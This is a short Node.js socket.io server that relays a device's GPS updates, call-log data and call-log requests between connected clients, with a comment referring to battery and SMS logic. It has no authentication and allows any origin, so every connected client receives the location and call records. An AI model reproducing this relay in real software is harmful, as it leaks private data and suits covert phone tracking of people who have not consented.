const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
    // Existing battery/SMS logic...

    // New GPS forwarding
    socket.on('gps-update', (data) => {
        socket.broadcast.emit('ui-gps', data);
    });

    // New Call Log Request/Response
    socket.on('get-calls-request', () => {
        socket.broadcast.emit('get-calls-request');
    });

    socket.on('call-log-data', (data) => {
        socket.broadcast.emit('ui-calls-display', data);
    });
});

server.listen(process.env.PORT || 3000);

